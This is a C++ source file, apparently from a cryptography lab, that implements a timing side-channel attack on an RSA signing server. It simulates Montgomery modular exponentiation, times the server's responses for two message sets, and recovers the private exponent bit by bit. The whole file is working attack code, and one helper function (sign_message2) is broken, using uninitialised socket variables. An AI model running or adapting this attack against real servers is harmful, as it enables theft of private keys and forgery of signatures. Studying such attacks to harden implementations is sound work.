#include "attacker.h"


int main(int argc, char *argv[]){
    // Print usage
    if (argc != 7) {
        printf("Usage:  ./attacker <host> <port> <e> <n> <number of messages> <current_derived_exponent> \n");
        exit(1);
    }

    Attacker a = Attacker(argv[1], atoi(argv[2]));
    a.public_e = argv[3];
    a.public_n = argv[4];
    a.messages_per_bit = argv[5];
    a.derived_exponent = argv[6];
    printf("Attacking server %s:%s. Using public exponent %s and modulus %s\n", argv[1], argv[2], argv[3], argv[4]);
    printf("So far, we have derived the exponent up to %d\n", atoi(argv[6]));
    a.perform_attack();
    return 0;
}

/*
 * Performs a timing attack on the server
 */
void Attacker::perform_attack(){
    if(!key_found()){
        attack_next_bit();
    }
    else {
        std::cout << "We found the key! It's: " << derived_exponent << std::endl;
//        printf("We found the key! It's %d!\n", derived_exponent);
    }
}


bool Attacker::key_found() {
    num test = Rsa::ModExp(12345, derived_exponent, public_n);
    num actual = sign_message(12345).response;
    return test == actual;
}

/*
 * Ask the server to sign @message, recording the time spent by the server.
 */
TimedResponse Attacker::sign_message(const std::string &message){
    // Record start and end time in nanoseconds.
    std::chrono::time_point<std::chrono::system_clock, std::chrono::duration<long long, std::ratio<1, 1000000000l> > > start, end;
    TimedResponse result;
    result.message = message;
    ssize_t n;
    char response[255];
    // Send mesage!
    start = std::chrono::system_clock::now();
    sendto(sock,message.c_str(),message.size(), 0, (struct sockaddr *)&server_addr,sizeof(server_addr));
    // Receive response!
    n = recv(sock,response,255,0);
    end = std::chrono::system_clock::now();
    response[n] = 0; // Null terminate received string
    result.response = response;
    result.duration = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start);
    return result;
}

TimedResponse Attacker::sign_message(const num &message){
    std::stringstream StrStream;
    StrStream << message;
    return sign_message(StrStream.str());
}

/*
 * Simulates Montgomery Modular exponentiation. Returns whether the MonPro calculation involved a
 * subtraction or not, on the last bit.
 */
bool Attacker::ModExpBoolean(const num &M, const num &d, const num &n){
    if (n%2 != 1) {
        std::cout << "Warning! Exponentiation failed. Modulus must be odd!" << std::endl;
        return false;
    }
    bool step4 = false, _ = false;
    num r, nprime;
    Rsa::nPrime(n, r, nprime);
    num M_bar = (M * r) % n;
    num x_bar = r%n;

    long k = Rsa::numBits(d) - 1; // Loop over bit indices. [0, k-1]
    for (; k >= 0 ; k--) {
        x_bar = MontgomeryProduct(x_bar, x_bar, nprime, r, n, _);
        if (d.GetBit(k) == 1){
            x_bar = MontgomeryProduct(M_bar, x_bar, nprime, r, n, _);
            if (k == 0) {
                step4 = _;
            }
        }
    }
    return step4;
}

num Attacker::MontgomeryProduct(const num &a, const num &b, const num &nprime, const num &r, const num &n, bool &step4){
    num t = a * b;
    num m = t * nprime % r;
    num u = (t + m*n)/r;
    if(u >=n) {
        step4 = true;
        return u-n;
    }
    else {
        step4 = false;
        return u;
    }
}


TimedResponse sign_message2(const std::string &message){
    int sock;
    int server_addr;
    // Record start and end time in nanoseconds.
    std::chrono::time_point<std::chrono::system_clock, std::chrono::duration<long long, std::ratio<1, 1000000000l> > > start, end;
    TimedResponse result;
    result.message = message;
    ssize_t n;
    char response[255];
    // Send mesage!
    start = std::chrono::system_clock::now();
    sendto(sock,message.c_str(),message.size(), 0, (struct sockaddr *)&server_addr,sizeof(server_addr));
    // Receive response!
    n = recv(sock,response,255,0);
    end = std::chrono::system_clock::now();
    response[n] = 0; // Null terminate received string
    result.response = response;
    result.duration = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start);
    return result;
}

/*
*  Divide messages into two list.
*/
void Attacker::attack_next_bit() {
    //The two sets
    std::vector<num> set_true;
    std::vector<num> set_false;
    std::vector<TimedResponse> trueResponses;
    std::vector<TimedResponse> falseResponses;

    //Simulate messages
    num guess = (derived_exponent << 1) + 1; // Guess that the next bit is 1.
    std::cout << "current guess: " << guess << std::endl;
    std::cout << "simulating exponentiation of " << messages_per_bit << "messages - dividing messages into two sets." << std::endl;
    for( num i = 0; i < messages_per_bit; i++ ) {
        num random_message(rand()) ;
        bool v = ModExpBoolean(random_message, guess, public_n);
        if(v){
            set_true.push_back(random_message);
        }
        else{
            set_false.push_back(random_message);
        }
    }

    /*
    * Calculate mean time for each set
    */
    std::cout<<"Requsting signatures from server...\n";
    long long tTrue = 0,tFalse = 0;
    for(num message: set_true){
        TimedResponse t = sign_message(message);
        tTrue += t.duration.count();
        trueResponses.push_back(t);
    }

    for( num message: set_false){
        TimedResponse t = sign_message(message);
        tFalse+=t.duration.count();
        falseResponses.push_back(t);
    }
    tTrue /= set_true.size();
    tFalse /= set_false.size();

    /* At this point we should decide whether we guessed correctly or not.
     * If the bit was indeed 1, set derived_exponent = guess.
     * Otherwise, set derived_exponent = guess-1.
     */

    printf("Average time true set: \t\t%lld ns.\n", tTrue);
    printf("Average time false set: \t%lld ns. \n", tFalse);
    printf("Ratio True/False time: \t\t%f\n", (tTrue*1.0)/tFalse);

    // Save the results as a CSV table, so we can graph it using R
    std::stringstream filename;
    filename << guess << ".csv";
    saveCSV(filename.str(), trueResponses, falseResponses);
    std::cout << "If the bit was 1, our derived exponent should now be: " << guess << "." << std::endl;
    std::cout << "Otherwise, it should be " << guess-1 << "."<< std::endl;
}

void Attacker::saveCSV(const std::string filename, const std::vector<TimedResponse> trueSet, const std::vector<TimedResponse> falseSet) const{
    std::ofstream myfile;
    myfile.open (filename);
    myfile << "message,duration,step4" << std::endl;
    for (auto e: trueSet) {
        myfile << e << ",1" << std::endl;
    }
    for (auto e: falseSet) {
        myfile << e << ",2" << std::endl;
    }
    myfile.close();
}









